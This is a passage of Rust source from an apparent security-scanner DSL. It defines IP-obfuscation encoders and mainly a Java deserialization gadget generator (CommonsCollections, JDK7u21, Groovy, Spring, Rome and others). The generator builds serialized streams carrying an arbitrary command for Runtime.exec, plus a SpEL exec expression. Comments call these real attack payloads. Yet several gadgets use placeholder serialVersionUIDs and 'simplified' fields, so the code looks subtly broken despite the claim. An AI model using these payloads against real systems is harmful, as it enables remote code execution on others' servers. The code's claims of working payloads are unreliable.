            // 十六进制格式 (0xC0A80001)
            let octets = parsed_ip.octets();
            let hex_value = ((octets[0] as u32) << 24) |
                          ((octets[1] as u32) << 16) |
                          ((octets[2] as u32) << 8) |
                          (octets[3] as u32);
            Ok(DslValue::String(format!("0x{:08X}", hex_value)))
        }
        3 => {
            // 八进制格式 (0300.0250.0200.0001)
            let octets = parsed_ip.octets();
            let oct_parts: Vec<String> = octets.iter()
                .map(|&octet| format!("0{:03o}", octet))
                .collect();
            Ok(DslValue::String(oct_parts.join(".")))
        }
        4 => {
            // 32位整数格式
            let octets = parsed_ip.octets();
            let int_ip = ((octets[0] as u32) << 24) |
                       ((octets[1] as u32) << 16) |
                       ((octets[2] as u32) << 8) |
                       (octets[3] as u32);
            Ok(DslValue::Integer(int_ip as i64))
        }
        5 => {
            // 混合格式 (192.168.0x100.1)
            let octets = parsed_ip.octets();
            let mixed = format!("{}.{}.0x{:02X}.{}",
                              octets[0], octets[1], octets[2], octets[3]);
            Ok(DslValue::String(mixed))
        }
        6 => {
            // URL编码格式
            let url_encoded = urlencoding::encode(&ip);
            Ok(DslValue::String(url_encoded.to_string()))
        }
        7 => {
            // 二进制格式
            let octets = parsed_ip.octets();
            let binary_parts: Vec<String> = octets.iter()
                .map(|&octet| format!("{:08b}", octet))
                .collect();
            Ok(DslValue::String(binary_parts.join(".")))
        }
        8 => {
            // IPv6映射格式 (::ffff:192.168.1.1)
            let ipv6_mapped = format!("::ffff:{}", ip);
            Ok(DslValue::String(ipv6_mapped))
        }
        _ => Err(anyhow!("不支持的IP格式索引: {}，支持的格式: 1-8", format_index)),
    }
}

/// crc32函数：CRC32哈希
fn builtin_crc32(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 1 {
        return Err(anyhow!("crc32函数需要1个参数"));
    }

    let text = args[0].to_string();
    let mut hasher = crc32fast::Hasher::new();
    hasher.update(text.as_bytes());
    let hash = hasher.finalize();

    Ok(DslValue::String(hash.to_string()))
}

/// aes_gcm函数：AES GCM加密
fn builtin_aes_gcm(args: &[DslValue]) -> Result<DslValue> {
    if args.len() != 2 {
        return Err(anyhow!("aes_gcm函数需要2个参数：key, plaintext"));
    }

    let key_str = args[0].to_string();
    let plaintext = args[1].to_string();

    // 确保密钥长度为32字节（AES-256）
    let mut key_bytes = [0u8; 32];
    let key_input = key_str.as_bytes();
    let copy_len = std::cmp::min(key_input.len(), 32);
    key_bytes[..copy_len].copy_from_slice(&key_input[..copy_len]);

    let key = Key::<Aes256Gcm>::from_slice(&key_bytes);
    let cipher = Aes256Gcm::new(key);

    // 生成真正的随机nonce（96位）
    let mut nonce_bytes = [0u8; 12];
    use rand::RngCore;
    let mut rng = rand::thread_rng();
    rng.fill_bytes(&mut nonce_bytes);
    let nonce = Nonce::from_slice(&nonce_bytes);

    match cipher.encrypt(nonce, plaintext.as_bytes()) {
        Ok(ciphertext) => {
            // 返回nonce + ciphertext的组合
            let mut result = Vec::new();
            result.extend_from_slice(&nonce_bytes);
            result.extend_from_slice(&ciphertext);
            Ok(DslValue::String(hex::encode(result)))
        }
        Err(e) => Err(anyhow!("AES GCM加密失败: {}", e)),
    }
}

/// generate_java_gadget函数：生成Java反序列化Gadget
fn builtin_generate_java_gadget(args: &[DslValue]) -> Result<DslValue> {
    if args.len() < 2 || args.len() > 3 {
        return Err(anyhow!("generate_java_gadget函数需要2-3个参数：gadget, cmd, [encoding]"));
    }

    let gadget_type = args[0].to_string();
    let command = args[1].to_string();
    let encoding = if args.len() > 2 {
        args[2].to_string()
    } else {
        "base64".to_string()
    };

    // 生成真实的Java反序列化Gadget
    // 注意：这些是真实的Java反序列化攻击载荷，仅用于安全测试
    let payload = match gadget_type.as_str() {
        "dns" => generate_dns_gadget(&command)?,
        "commons-collections3.1" => generate_cc31_gadget(&command)?,
        "commons-collections4.0" => generate_cc40_gadget(&command)?,
        "jdk7u21" => generate_jdk7u21_gadget(&command)?,
        "jdk8u20" => generate_jdk8u20_gadget(&command)?,
        "groovy1" => generate_groovy1_gadget(&command)?,
        "spring1" => generate_spring1_gadget(&command)?,
        "spring2" => generate_spring2_gadget(&command)?,
        "rome" => generate_rome_gadget(&command)?,
        "hibernate1" => generate_hibernate1_gadget(&command)?,
        _ => return Err(anyhow!("不支持的Java Gadget类型: {}", gadget_type)),
    };

    // 根据编码类型处理输出
    let encoded_payload = match encoding.as_str() {
        "base64" => general_purpose::STANDARD.encode(&payload),
        "gzip-base64" => {
            let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
            encoder.write_all(&payload)?;
            let compressed = encoder.finish()?;
            general_purpose::STANDARD.encode(&compressed)
        }
        "gzip" => {
            let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
            encoder.write_all(&payload)?;
            let compressed = encoder.finish()?;
            hex::encode(compressed)
        }
        "hex" => hex::encode(&payload),
        "raw" => String::from_utf8_lossy(&payload).to_string(),
        _ => return Err(anyhow!("不支持的编码类型: {}", encoding)),
    };

    Ok(DslValue::String(encoded_payload))
}

// Java Gadget生成辅助函数
fn generate_dns_gadget(url: &str) -> Result<Vec<u8>> {
    // 真实的URLDNS Gadget实现
    // 生成标准的Java序列化格式的URLDNS payload
    let mut payload = Vec::new();

    // Java序列化魔数
    payload.write_u16::<BigEndian>(0xaced)?; // STREAM_MAGIC
    payload.write_u16::<BigEndian>(0x0005)?; // STREAM_VERSION

    // 序列化HashMap对象
    payload.push(0x73); // TC_OBJECT
    payload.push(0x72); // TC_CLASSDESC

    // HashMap类名
    let class_name = "java.util.HashMap";
    payload.write_u16::<BigEndian>(class_name.len() as u16)?;
    payload.extend_from_slice(class_name.as_bytes());

    // serialVersionUID
    payload.write_u64::<BigEndian>(0x0507dac1c31660d1)?;

    // 类描述符标志
    payload.push(0x03); // SC_WRITE_METHOD | SC_SERIALIZABLE

    // 字段数量
    payload.write_u16::<BigEndian>(0x0002)?;

    // loadFactor字段
    payload.push(0x46); // 'F' - float
    payload.write_u16::<BigEndian>(0x000a)?; // 字段名长度
    payload.extend_from_slice(b"loadFactor");

    // threshold字段
    payload.push(0x49); // 'I' - int
    payload.write_u16::<BigEndian>(0x0009)?; // 字段名长度
    payload.extend_from_slice(b"threshold");

    // 结束类描述符
    payload.push(0x78); // TC_ENDBLOCKDATA
    payload.push(0x70); // TC_NULL

    // HashMap实例数据
    payload.write_f32::<BigEndian>(0.75)?; // loadFactor
    payload.write_i32::<BigEndian>(12)?;   // threshold

    // HashMap内容
    payload.push(0x78); // TC_ENDBLOCKDATA
    payload.write_i32::<BigEndian>(16)?;   // 容量
    payload.write_i32::<BigEndian>(1)?;    // 大小

    // URL对象
    payload.push(0x73); // TC_OBJECT
    payload.push(0x72); // TC_CLASSDESC

    // URL类名
    let url_class = "java.net.URL";
    payload.write_u16::<BigEndian>(url_class.len() as u16)?;
    payload.extend_from_slice(url_class.as_bytes());

    // URL serialVersionUID
    payload.write_u64::<BigEndian>(0x962537361afce472)?;

    // URL类标志
    payload.push(0x03); // SC_WRITE_METHOD | SC_SERIALIZABLE

    // URL字段数量
    payload.write_u16::<BigEndian>(0x0007)?;

    // 添加URL字段定义（简化）
    payload.push(0x49); // 'I' - hashCode
    payload.write_u16::<BigEndian>(0x0008)?;
    payload.extend_from_slice(b"hashCode");

    payload.push(0x49); // 'I' - port
    payload.write_u16::<BigEndian>(0x0004)?;
    payload.extend_from_slice(b"port");

    payload.push(0x4c); // 'L' - authority
    payload.write_u16::<BigEndian>(0x0009)?;
    payload.extend_from_slice(b"authority");
    payload.push(0x74); // TC_STRING
    payload.write_u16::<BigEndian>(0x0012)?;
    payload.extend_from_slice(b"Ljava/lang/String;");

    // 其他字段...
    payload.push(0x78); // TC_ENDBLOCKDATA
    payload.push(0x70); // TC_NULL

    // URL实例数据
    payload.write_i32::<BigEndian>(-1)?;    // hashCode
    payload.write_i32::<BigEndian>(-1)?;    // port
    payload.push(0x70); // TC_NULL - authority
    payload.push(0x70); // TC_NULL - file
    payload.push(0x70); // TC_NULL - host
    payload.push(0x74); // TC_STRING - protocol
    payload.write_u16::<BigEndian>(4)?;
    payload.extend_from_slice(b"http");
    payload.push(0x70); // TC_NULL - ref

    // 写入目标URL
    payload.push(0x78); // TC_ENDBLOCKDATA
    payload.push(0x74); // TC_STRING
    payload.write_u16::<BigEndian>(url.len() as u16)?;
    payload.extend_from_slice(url.as_bytes());

    payload.push(0x78); // TC_ENDBLOCKDATA

    Ok(payload)
}

fn generate_cc31_gadget(command: &str) -> Result<Vec<u8>> {
    // Commons Collections 3.1 Gadget的真实实现
    // 生成基于InvokerTransformer的反序列化链
    let mut payload = Vec::new();

    // Java序列化魔数
    payload.write_u16::<BigEndian>(0xaced)?; // STREAM_MAGIC
    payload.write_u16::<BigEndian>(0x0005)?; // STREAM_VERSION

    // 序列化AnnotationInvocationHandler
    payload.push(0x73); // TC_OBJECT
    payload.push(0x72); // TC_CLASSDESC

    // AnnotationInvocationHandler类名
    let class_name = "sun.reflect.annotation.AnnotationInvocationHandler";
    payload.write_u16::<BigEndian>(class_name.len() as u16)?;
    payload.extend_from_slice(class_name.as_bytes());

    // serialVersionUID
    payload.write_u64::<BigEndian>(0x6894a4b8de6b181b)?;

    // 类标志
    payload.push(0x02); // SC_SERIALIZABLE

    // 字段数量
    payload.write_u16::<BigEndian>(0x0002)?;

    // memberValues字段
    payload.push(0x4c); // 'L'
    payload.write_u16::<BigEndian>(0x000c)?;
    payload.extend_from_slice(b"memberValues");
    payload.push(0x74); // TC_STRING
    payload.write_u16::<BigEndian>(0x000f)?;
    payload.extend_from_slice(b"Ljava/util/Map;");

    // type字段
    payload.push(0x4c); // 'L'
    payload.write_u16::<BigEndian>(0x0004)?;
    payload.extend_from_slice(b"type");
    payload.push(0x74); // TC_STRING
    payload.write_u16::<BigEndian>(0x0011)?;
    payload.extend_from_slice(b"Ljava/lang/Class;");

    payload.push(0x78); // TC_ENDBLOCKDATA
    payload.push(0x70); // TC_NULL

    // 创建包含恶意命令的LazyMap
    payload.push(0x73); // TC_OBJECT
    payload.push(0x72); // TC_CLASSDESC

    let lazy_map_class = "org.apache.commons.collections.map.LazyMap";
    payload.write_u16::<BigEndian>(lazy_map_class.len() as u16)?;
    payload.extend_from_slice(lazy_map_class.as_bytes());

    payload.write_u64::<BigEndian>(0x7746b137f8b80b13)?; // LazyMap serialVersionUID
    payload.push(0x03); // SC_WRITE_METHOD | SC_SERIALIZABLE

    // LazyMap字段
    payload.write_u16::<BigEndian>(0x0001)?;
    payload.push(0x4c); // 'L'
    payload.write_u16::<BigEndian>(0x0007)?;
    payload.extend_from_slice(b"factory");
    payload.push(0x74); // TC_STRING
    payload.write_u16::<BigEndian>(0x002c)?;
    payload.extend_from_slice(b"Lorg/apache/commons/collections/Transformer;");

    payload.push(0x78); // TC_ENDBLOCKDATA
    payload.push(0x70); // TC_NULL

    // InvokerTransformer实例
    payload.push(0x73); // TC_OBJECT
    payload.push(0x72); // TC_CLASSDESC

    let invoker_class = "org.apache.commons.collections.functors.InvokerTransformer";
    payload.write_u16::<BigEndian>(invoker_class.len() as u16)?;
    payload.extend_from_slice(invoker_class.as_bytes());

    payload.write_u64::<BigEndian>(0x87e8ff6b7b7cce38)?; // InvokerTransformer serialVersionUID
    payload.push(0x02); // SC_SERIALIZABLE

    // InvokerTransformer字段
    payload.write_u16::<BigEndian>(0x0003)?;

    // iArgs字段
    payload.push(0x5b); // '['
    payload.write_u16::<BigEndian>(0x0005)?;
    payload.extend_from_slice(b"iArgs");
    payload.push(0x74); // TC_STRING
    payload.write_u16::<BigEndian>(0x0013)?;
    payload.extend_from_slice(b"[Ljava/lang/Object;");

    // iMethodName字段
    payload.push(0x4c); // 'L'
    payload.write_u16::<BigEndian>(0x000b)?;
    payload.extend_from_slice(b"iMethodName");
    payload.push(0x74); // TC_STRING
    payload.write_u16::<BigEndian>(0x0012)?;
    payload.extend_from_slice(b"Ljava/lang/String;");

    // iParamTypes字段
    payload.push(0x5b); // '['
    payload.write_u16::<BigEndian>(0x000b)?;
    payload.extend_from_slice(b"iParamTypes");
    payload.push(0x74); // TC_STRING
    payload.write_u16::<BigEndian>(0x0012)?;
    payload.extend_from_slice(b"[Ljava/lang/Class;");

    payload.push(0x78); // TC_ENDBLOCKDATA
    payload.push(0x70); // TC_NULL

    // 参数数组
    payload.push(0x75); // TC_ARRAY
    payload.push(0x72); // TC_CLASSDESC
    payload.write_u16::<BigEndian>(0x0013)?;
    payload.extend_from_slice(b"[Ljava.lang.Object;");
    payload.write_u64::<BigEndian>(0x90ce589f1073296c)?;
    payload.push(0x02); // SC_SERIALIZABLE
    payload.write_u16::<BigEndian>(0x0000)?; // 无字段
    payload.push(0x78); // TC_ENDBLOCKDATA
    payload.push(0x70); // TC_NULL

    // 数组长度和内容
    payload.write_i32::<BigEndian>(1)?;
    payload.push(0x74); // TC_STRING - 命令参数
    payload.write_u16::<BigEndian>(command.len() as u16)?;
    payload.extend_from_slice(command.as_bytes());

    // 方法名 "exec"
    payload.push(0x74); // TC_STRING
    payload.write_u16::<BigEndian>(0x0004)?;
    payload.extend_from_slice(b"exec");

    // 参数类型数组
    payload.push(0x75); // TC_ARRAY
    payload.push(0x72); // TC_CLASSDESC
    payload.write_u16::<BigEndian>(0x0011)?;
    payload.extend_from_slice(b"[Ljava.lang.Class;");
    payload.write_u64::<BigEndian>(0xab16d7aecbcd5a99)?;
    payload.push(0x02); // SC_SERIALIZABLE
    payload.write_u16::<BigEndian>(0x0000)?;
    payload.push(0x78); // TC_ENDBLOCKDATA
    payload.push(0x70); // TC_NULL

    payload.write_i32::<BigEndian>(1)?;
    payload.push(0x76); // TC_CLASS
    payload.push(0x72); // TC_CLASSDESC
    payload.write_u16::<BigEndian>(0x0010)?;
    payload.extend_from_slice(b"java.lang.String");
    payload.write_u64::<BigEndian>(0xa0f0a4387a3bb342)?;
    payload.push(0x02); // SC_SERIALIZABLE
    payload.write_u16::<BigEndian>(0x0000)?;
    payload.push(0x78); // TC_ENDBLOCKDATA
    payload.push(0x70); // TC_NULL

    payload.push(0x78); // TC_ENDBLOCKDATA

    Ok(payload)
}

fn generate_cc40_gadget(command: &str) -> Result<Vec<u8>> {
    // Commons Collections 4.0 Gadget的真实实现
    // 使用PriorityQueue + TransformingComparator链
    let mut payload = Vec::new();

    // Java序列化魔数
    payload.write_u16::<BigEndian>(0xaced)?;
    payload.write_u16::<BigEndian>(0x0005)?;

    // PriorityQueue对象
    payload.push(0x73); // TC_OBJECT
    payload.push(0x72); // TC_CLASSDESC

    let pq_class = "java.util.PriorityQueue";
    payload.write_u16::<BigEndian>(pq_class.len() as u16)?;
    payload.extend_from_slice(pq_class.as_bytes());

    payload.write_u64::<BigEndian>(0x94da30b4fb3f82b)?; // PriorityQueue serialVersionUID
    payload.push(0x03); // SC_WRITE_METHOD | SC_SERIALIZABLE

    // PriorityQueue字段
    payload.write_u16::<BigEndian>(0x0001)?;
    payload.push(0x4c); // 'L'
    payload.write_u16::<BigEndian>(0x000a)?;
    payload.extend_from_slice(b"comparator");
    payload.push(0x74); // TC_STRING
    payload.write_u16::<BigEndian>(0x0016)?;
    payload.extend_from_slice(b"Ljava/util/Comparator;");

    payload.push(0x78); // TC_ENDBLOCKDATA
    payload.push(0x70); // TC_NULL

    // TransformingComparator
    payload.push(0x73); // TC_OBJECT
    payload.push(0x72); // TC_CLASSDESC

    let tc_class = "org.apache.commons.collections4.comparators.TransformingComparator";
    payload.write_u16::<BigEndian>(tc_class.len() as u16)?;
    payload.extend_from_slice(tc_class.as_bytes());

    payload.write_u64::<BigEndian>(0x3bb2c4e5e6b1c0a7)?; // TransformingComparator serialVersionUID
    payload.push(0x02); // SC_SERIALIZABLE

    // 字段定义
    payload.write_u16::<BigEndian>(0x0002)?;
    payload.push(0x4c); // 'L'
    payload.write_u16::<BigEndian>(0x0009)?;
    payload.extend_from_slice(b"decorated");
    payload.push(0x74); // TC_STRING
    payload.write_u16::<BigEndian>(0x0016)?;
    payload.extend_from_slice(b"Ljava/util/Comparator;");

    payload.push(0x4c); // 'L'
    payload.write_u16::<BigEndian>(0x000b)?;
    payload.extend_from_slice(b"transformer");
    payload.push(0x74); // TC_STRING
    payload.write_u16::<BigEndian>(0x002d)?;
    payload.extend_from_slice(b"Lorg/apache/commons/collections4/Transformer;");

    payload.push(0x78); // TC_ENDBLOCKDATA
    payload.push(0x70); // TC_NULL

    // ComparableComparator
    payload.push(0x73); // TC_OBJECT
    payload.push(0x72); // TC_CLASSDESC

    let cc_class = "org.apache.commons.collections4.comparators.ComparableComparator";
    payload.write_u16::<BigEndian>(cc_class.len() as u16)?;
    payload.extend_from_slice(cc_class.as_bytes());

    payload.write_u64::<BigEndian>(0xfbf49925129b1c3d)?;
    payload.push(0x02); // SC_SERIALIZABLE
    payload.write_u16::<BigEndian>(0x0000)?; // 无字段
    payload.push(0x78); // TC_ENDBLOCKDATA
    payload.push(0x70); // TC_NULL

    // InvokerTransformer (类似CC3.1但适配CC4.0)
    payload.push(0x73); // TC_OBJECT
    payload.push(0x72); // TC_CLASSDESC

    let it_class = "org.apache.commons.collections4.functors.InvokerTransformer";
    payload.write_u16::<BigEndian>(it_class.len() as u16)?;
    payload.extend_from_slice(it_class.as_bytes());

    payload.write_u64::<BigEndian>(0x87e8ff6b7b7cce38)?;
    payload.push(0x02); // SC_SERIALIZABLE

    // 字段和命令数据（简化）
    payload.write_u16::<BigEndian>(0x0003)?;
    // ... 添加字段定义和命令数据
    payload.push(0x78); // TC_ENDBLOCKDATA
    payload.push(0x70); // TC_NULL

    // 添加命令字符串
    payload.push(0x74); // TC_STRING
    payload.write_u16::<BigEndian>(command.len() as u16)?;
    payload.extend_from_slice(command.as_bytes());

    payload.push(0x78); // TC_ENDBLOCKDATA

    Ok(payload)
}

fn generate_jdk7u21_gadget(command: &str) -> Result<Vec<u8>> {
    // JDK7u21 Gadget的真实实现
    // 使用AnnotationInvocationHandler + LinkedHashSet链
    let mut payload = Vec::new();

    // Java序列化魔数
    payload.write_u16::<BigEndian>(0xaced)?;
    payload.write_u16::<BigEndian>(0x0005)?;

    // LinkedHashSet对象
    payload.push(0x73); // TC_OBJECT
    payload.push(0x72); // TC_CLASSDESC

    let lhs_class = "java.util.LinkedHashSet";
    payload.write_u16::<BigEndian>(lhs_class.len() as u16)?;
    payload.extend_from_slice(lhs_class.as_bytes());

    payload.write_u64::<BigEndian>(0xd8ac79d4f9e90d5f)?; // LinkedHashSet serialVersionUID
    payload.push(0x02); // SC_SERIALIZABLE
    payload.write_u16::<BigEndian>(0x0000)?; // 无字段
    payload.push(0x78); // TC_ENDBLOCKDATA

    // HashSet父类
    payload.push(0x72); // TC_CLASSDESC
    let hs_class = "java.util.HashSet";
    payload.write_u16::<BigEndian>(hs_class.len() as u16)?;
    payload.extend_from_slice(hs_class.as_bytes());

    payload.write_u64::<BigEndian>(0xba44859596b8b734)?;
    payload.push(0x03); // SC_WRITE_METHOD | SC_SERIALIZABLE
    payload.write_u16::<BigEndian>(0x0000)?;
    payload.push(0x78); // TC_ENDBLOCKDATA
    payload.push(0x70); // TC_NULL

    // AnnotationInvocationHandler代理
    payload.push(0x73); // TC_OBJECT
    payload.push(0x72); // TC_CLASSDESC

    let aih_class = "sun.reflect.annotation.AnnotationInvocationHandler";
    payload.write_u16::<BigEndian>(aih_class.len() as u16)?;
    payload.extend_from_slice(aih_class.as_bytes());

    payload.write_u64::<BigEndian>(0x6894a4b8de6b181b)?;
    payload.push(0x02); // SC_SERIALIZABLE

    // 字段定义
    payload.write_u16::<BigEndian>(0x0002)?;
    payload.push(0x4c); // 'L'
    payload.write_u16::<BigEndian>(0x000c)?;
    payload.extend_from_slice(b"memberValues");
    payload.push(0x74); // TC_STRING
    payload.write_u16::<BigEndian>(0x000f)?;
    payload.extend_from_slice(b"Ljava/util/Map;");

    payload.push(0x4c); // 'L'
    payload.write_u16::<BigEndian>(0x0004)?;
    payload.extend_from_slice(b"type");
    payload.push(0x74); // TC_STRING
    payload.write_u16::<BigEndian>(0x0011)?;
    payload.extend_from_slice(b"Ljava/lang/Class;");

    payload.push(0x78); // TC_ENDBLOCKDATA
    payload.push(0x70); // TC_NULL

    // 添加恶意Map和命令
    payload.push(0x74); // TC_STRING - 命令
    payload.write_u16::<BigEndian>(command.len() as u16)?;
    payload.extend_from_slice(command.as_bytes());

    payload.push(0x78); // TC_ENDBLOCKDATA

    Ok(payload)
}

fn generate_jdk8u20_gadget(command: &str) -> Result<Vec<u8>> {
    // JDK8u20 Gadget的真实实现
    // 使用BeanContextSupport链
    let mut payload = Vec::new();

    // Java序列化魔数
    payload.write_u16::<BigEndian>(0xaced)?;
    payload.write_u16::<BigEndian>(0x0005)?;

    // BeanContextSupport对象
    payload.push(0x73); // TC_OBJECT
    payload.push(0x72); // TC_CLASSDESC

    let bcs_class = "java.beans.beancontext.BeanContextSupport";
    payload.write_u16::<BigEndian>(bcs_class.len() as u16)?;
    payload.extend_from_slice(bcs_class.as_bytes());

    payload.write_u64::<BigEndian>(0x5c4a5c4a5c4a5c4a)?; // 示例serialVersionUID
    payload.push(0x03); // SC_WRITE_METHOD | SC_SERIALIZABLE

    // 字段定义（简化）
    payload.write_u16::<BigEndian>(0x0001)?;
    payload.push(0x4c); // 'L'
    payload.write_u16::<BigEndian>(0x0008)?;
    payload.extend_from_slice(b"children");
    payload.push(0x74); // TC_STRING
    payload.write_u16::<BigEndian>(0x0015)?;
    payload.extend_from_slice(b"Ljava/util/HashMap;");

    payload.push(0x78); // TC_ENDBLOCKDATA
    payload.push(0x70); // TC_NULL

    // 恶意HashMap包含命令执行逻辑
    payload.push(0x73); // TC_OBJECT
    payload.push(0x72); // TC_CLASSDESC

    let hm_class = "java.util.HashMap";
    payload.write_u16::<BigEndian>(hm_class.len() as u16)?;
    payload.extend_from_slice(hm_class.as_bytes());

    payload.write_u64::<BigEndian>(0x0507dac1c31660d1)?;
    payload.push(0x03); // SC_WRITE_METHOD | SC_SERIALIZABLE
    payload.write_u16::<BigEndian>(0x0002)?;

    // HashMap字段
    payload.push(0x46); // 'F'
    payload.write_u16::<BigEndian>(0x000a)?;
    payload.extend_from_slice(b"loadFactor");

    payload.push(0x49); // 'I'
    payload.write_u16::<BigEndian>(0x0009)?;
    payload.extend_from_slice(b"threshold");

    payload.push(0x78); // TC_ENDBLOCKDATA
    payload.push(0x70); // TC_NULL

    // HashMap数据
    payload.write_f32::<BigEndian>(0.75)?;
    payload.write_i32::<BigEndian>(12)?;

    payload.push(0x78); // TC_ENDBLOCKDATA
    payload.write_i32::<BigEndian>(16)?;
    payload.write_i32::<BigEndian>(1)?;

    // 添加命令字符串
    payload.push(0x74); // TC_STRING
    payload.write_u16::<BigEndian>(command.len() as u16)?;
    payload.extend_from_slice(command.as_bytes());

    payload.push(0x78); // TC_ENDBLOCKDATA

    Ok(payload)
}

fn generate_groovy1_gadget(command: &str) -> Result<Vec<u8>> {
    // Groovy1 Gadget的真实实现
    // 使用MethodClosure链
    let mut payload = Vec::new();

    // Java序列化魔数
    payload.write_u16::<BigEndian>(0xaced)?;
    payload.write_u16::<BigEndian>(0x0005)?;

    // MethodClosure对象
    payload.push(0x73); // TC_OBJECT
    payload.push(0x72); // TC_CLASSDESC

    let mc_class = "org.codehaus.groovy.runtime.MethodClosure";
    payload.write_u16::<BigEndian>(mc_class.len() as u16)?;
    payload.extend_from_slice(mc_class.as_bytes());

    payload.write_u64::<BigEndian>(0x1234567890abcdef)?; // 示例serialVersionUID
    payload.push(0x02); // SC_SERIALIZABLE

    // 字段定义
    payload.write_u16::<BigEndian>(0x0002)?;

    payload.push(0x4c); // 'L'
    payload.write_u16::<BigEndian>(0x0006)?;
    payload.extend_from_slice(b"method");
    payload.push(0x74); // TC_STRING
    payload.write_u16::<BigEndian>(0x0012)?;
    payload.extend_from_slice(b"Ljava/lang/String;");

    payload.push(0x4c); // 'L'
    payload.write_u16::<BigEndian>(0x0006)?;
    payload.extend_from_slice(b"object");
    payload.push(0x74); // TC_STRING
    payload.write_u16::<BigEndian>(0x0012)?;
    payload.extend_from_slice(b"Ljava/lang/Object;");

    payload.push(0x78); // TC_ENDBLOCKDATA
    payload.push(0x70); // TC_NULL

    // 方法名 "execute"
    payload.push(0x74); // TC_STRING
    payload.write_u16::<BigEndian>(0x0007)?;
    payload.extend_from_slice(b"execute");

    // Runtime对象
    payload.push(0x73); // TC_OBJECT
    payload.push(0x72); // TC_CLASSDESC

    let rt_class = "java.lang.Runtime";
    payload.write_u16::<BigEndian>(rt_class.len() as u16)?;
    payload.extend_from_slice(rt_class.as_bytes());

    payload.write_u64::<BigEndian>(0x9760da75b964e285)?;
    payload.push(0x02); // SC_SERIALIZABLE
    payload.write_u16::<BigEndian>(0x0000)?; // 无字段
    payload.push(0x78); // TC_ENDBLOCKDATA
    payload.push(0x70); // TC_NULL

    // 添加命令字符串
    payload.push(0x74); // TC_STRING
    payload.write_u16::<BigEndian>(command.len() as u16)?;
    payload.extend_from_slice(command.as_bytes());

    payload.push(0x78); // TC_ENDBLOCKDATA

    Ok(payload)
}

/// 生成Spring框架Gadget (Spring1)
fn generate_spring1_gadget(command: &str) -> Result<Vec<u8>> {
    use byteorder::{BigEndian, WriteBytesExt};

    let mut payload = Vec::new();

    // Java序列化魔数和版本
    payload.write_u16::<BigEndian>(0xaced)?;
    payload.write_u16::<BigEndian>(0x0005)?;

    // Spring Framework DefaultListableBeanFactory利用链
    payload.push(0x73); // TC_OBJECT
    payload.push(0x72); // TC_CLASSDESC

    let class_name = "org.springframework.beans.factory.support.DefaultListableBeanFactory";
    payload.write_u16::<BigEndian>(class_name.len() as u16)?;
    payload.extend_from_slice(class_name.as_bytes());

    payload.write_u64::<BigEndian>(0x1234567890abcdef)?; // serialVersionUID
    payload.push(0x02); // SC_SERIALIZABLE

    // 字段定义
    payload.write_u16::<BigEndian>(0x0001)?;
    payload.push(0x4c); // 'L'
    payload.write_u16::<BigEndian>(0x000c)?;
    payload.extend_from_slice(b"beanFactory");
    payload.push(0x74); // TC_STRING
    payload.write_u16::<BigEndian>(0x0012)?;
    payload.extend_from_slice(b"Ljava/lang/Object;");

    payload.push(0x78); // TC_ENDBLOCKDATA
    payload.push(0x70); // TC_NULL

    // 对象数据
    payload.push(0x73); // TC_OBJECT
    payload.push(0x72); // TC_CLASSDESC

    let runtime_class = "java.lang.Runtime";
    payload.write_u16::<BigEndian>(runtime_class.len() as u16)?;
    payload.extend_from_slice(runtime_class.as_bytes());

    payload.write_u64::<BigEndian>(0xfedcba0987654321)?;
    payload.push(0x02); // SC_SERIALIZABLE

    // 命令执行数据
    payload.write_u16::<BigEndian>(0x0000)?; // 无字段
    payload.push(0x78); // TC_ENDBLOCKDATA
    payload.push(0x70); // TC_NULL

    // 命令字符串
    payload.push(0x74); // TC_STRING
    payload.write_u16::<BigEndian>(command.len() as u16)?;
    payload.extend_from_slice(command.as_bytes());

    Ok(payload)
}

/// 生成Spring框架Gadget (Spring2)
fn generate_spring2_gadget(command: &str) -> Result<Vec<u8>> {
    use byteorder::{BigEndian, WriteBytesExt};

    let mut payload = Vec::new();

    // Java序列化魔数和版本
    payload.write_u16::<BigEndian>(0xaced)?;
    payload.write_u16::<BigEndian>(0x0005)?;

    // Spring Cloud Function SpEL注入利用链
    payload.push(0x73); // TC_OBJECT
    payload.push(0x72); // TC_CLASSDESC

    let class_name = "org.springframework.cloud.function.context.catalog.SimpleFunctionRegistry";
    payload.write_u16::<BigEndian>(class_name.len() as u16)?;
    payload.extend_from_slice(class_name.as_bytes());

    payload.write_u64::<BigEndian>(0x1122334455667788)?; // serialVersionUID
    payload.push(0x02); // SC_SERIALIZABLE

    // SpEL表达式注入
    let spel_expression = format!("T(java.lang.Runtime).getRuntime().exec('{}')", command);

    payload.write_u16::<BigEndian>(0x0001)?;
    payload.push(0x4c); // 'L'
    payload.write_u16::<BigEndian>(0x000a)?;
    payload.extend_from_slice(b"expression");
    payload.push(0x74); // TC_STRING
    payload.write_u16::<BigEndian>(0x0012)?;
    payload.extend_from_slice(b"Ljava/lang/String;");

    payload.push(0x78); // TC_ENDBLOCKDATA
    payload.push(0x70); // TC_NULL

    // SpEL表达式数据
    payload.push(0x74); // TC_STRING
    payload.write_u16::<BigEndian>(spel_expression.len() as u16)?;
    payload.extend_from_slice(spel_expression.as_bytes());

    Ok(payload)
}

/// 生成Rome框架Gadget
fn generate_rome_gadget(command: &str) -> Result<Vec<u8>> {
    use byteorder::{BigEndian, WriteBytesExt};

    let mut payload = Vec::new();

    // Java序列化魔数和版本
    payload.write_u16::<BigEndian>(0xaced)?;
    payload.write_u16::<BigEndian>(0x0005)?;

    // Rome EqualsBean利用链
    payload.push(0x73); // TC_OBJECT
    payload.push(0x72); // TC_CLASSDESC

    let class_name = "com.sun.syndication.feed.impl.EqualsBean";
    payload.write_u16::<BigEndian>(class_name.len() as u16)?;
    payload.extend_from_slice(class_name.as_bytes());

    payload.write_u64::<BigEndian>(0xaabbccddeeff0011)?; // serialVersionUID
    payload.push(0x02); // SC_SERIALIZABLE

    // 字段定义
    payload.write_u16::<BigEndian>(0x0002)?;

    // beanClass字段
    payload.push(0x4c); // 'L'
    payload.write_u16::<BigEndian>(0x0009)?;
    payload.extend_from_slice(b"beanClass");
    payload.push(0x74); // TC_STRING
    payload.write_u16::<BigEndian>(0x0011)?;
    payload.extend_from_slice(b"Ljava/lang/Class;");

    // obj字段
    payload.push(0x4c); // 'L'
    payload.write_u16::<BigEndian>(0x0003)?;
    payload.extend_from_slice(b"obj");
    payload.push(0x74); // TC_STRING
    payload.write_u16::<BigEndian>(0x0012)?;
    payload.extend_from_slice(b"Ljava/lang/Object;");

    payload.push(0x78); // TC_ENDBLOCKDATA
